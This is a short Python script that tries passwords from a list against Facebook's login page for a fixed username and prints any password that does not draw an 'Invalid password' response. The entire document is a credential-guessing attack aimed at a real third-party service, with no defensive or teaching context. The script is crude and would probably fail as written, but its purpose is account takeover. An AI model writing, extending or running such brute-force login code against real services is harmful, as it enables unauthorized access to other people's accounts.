import requests

url = "https://www.facebook.com/login"
username = "rootadmin777"
passwords = ["password"]

for password in passwords:
    response = requests.post(url, data={"username": username, "password": password})
    if "Invalid password" not in response.text:
        print(f"Successful login with password: {password}")
        break
